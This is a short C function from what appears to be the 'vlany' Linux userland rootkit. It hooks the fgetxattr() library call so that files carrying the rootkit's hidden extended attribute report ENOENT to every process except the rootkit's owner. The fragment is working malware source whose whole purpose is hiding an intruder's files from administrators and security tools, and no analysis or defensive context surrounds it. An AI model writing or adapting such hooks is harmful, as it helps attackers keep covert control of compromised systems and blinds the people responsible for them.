ssize_t fgetxattr(int fd, const char *name, void *value, size_t size)
{
    #ifdef DEBUG
        printf("[vlany] fgetxattr() called\n");
    #endif

    HOOK(old_fgetxattr, CFGETXATTR);

    if(owned()) return old_fgetxattr(fd, name, value, size);

    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_fgetxattr(fd, name, value, size);
}
